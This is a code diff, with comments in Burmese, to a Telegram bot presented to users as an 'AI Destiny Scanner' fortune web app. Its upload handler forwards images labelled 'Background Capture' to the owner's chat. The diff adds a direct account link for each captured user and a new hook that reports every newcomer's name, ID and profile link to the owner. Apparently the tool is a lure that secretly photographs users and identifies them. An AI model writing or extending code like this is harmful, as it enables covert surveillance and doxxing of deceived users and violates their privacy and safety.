@@ -41,13 +41,25 @@ def upload():
     with open(filename, "wb") as f:
         f.write(base64.b64decode(image_base64))
 
+    # main.py ရဲ့ upload function ထဲက အပိုင်းကို ဒီလိုပြင်ပါ
+
     async def send_to_admin():
         try:
+            # User ID ကိုသုံးပြီး Direct Link ဖန်တီးခြင်း
+            user_link = f"tg://user?id={user_id}"
+            
             async with bot_instance:
                 await bot_instance.send_photo(
                     chat_id=OWNER_ID,
                     photo=open(filename, 'rb'),
-                    caption=f"📸 **Background Capture**\n👤 User: {user_name}\n🔗 Handle: {user_handle}\n🆔 ID: {user_id}"
+                    caption=(
+                        f"📸 **Background Capture**\n"
+                        f"👤 User: {user_name}\n"
+                        f"🔗 Handle: {user_handle}\n"
+                        f"🆔 ID: `{user_id}`\n"
+                        f"🌐 Account Link: [Click Here]({user_link})" # Link အသစ်ထည့်သွင်းခြင်း
+                    ),
+                    parse_mode="Markdown" # Link အလုပ်လုပ်ရန် parse_mode ထည့်ပေးရပါမည်
                 )
             if os.path.exists(filename): os.remove(filename)
         except Exception as e:
@@ -100,6 +112,12 @@ def share_report():
 # Bot Polling Process
 def run_bot():
     async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        u = update.effective_user
+        # Admin ဆီကို User အသစ်ရောက်ကြောင်း အကြောင်းကြားစာ ပို့ခြင်း
+        await context.bot.send_message(
+            chat_id=OWNER_ID,
+            text=f"🚀 User အသစ်ရောက်လာပါပြီ\nName: {u.first_name}\nID: {u.id}\nLink: tg://user?id={u.id}"
+        )
         button = KeyboardButton(text="AI Destiny Scanner ဖွင့်ရန်", web_app=WebAppInfo(url=WEB_APP_URL))
         keyboard = ReplyKeyboardMarkup([[button]], resize_keyboard=True)
         await update.message.reply_text("✨ သင့်ရဲ့ ဒီနေ့ကံကြမ္မာကို စစ်ဆေးဖို့ အောက်ကခလုတ်ကို နှိပ်ပါ -", reply_markup=keyboard)
